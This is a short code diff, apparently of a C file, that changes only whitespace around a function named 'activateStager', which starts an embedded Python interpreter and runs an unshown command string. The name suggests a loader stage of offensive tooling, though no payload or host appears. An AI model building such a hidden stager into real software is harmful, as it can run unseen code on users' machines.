@@ -14,7 +14,7 @@ void* activateStager()
     setlocale(LC_ALL, "en_US.URF-8");
     Py_Initialize();
     PyRun_SimpleString(cmd);
-    
+
     Py_Finalize();
     return 0;
 }
@@ -35,5 +35,3 @@ static int initializer()
 
     return 0;
 }
-
-
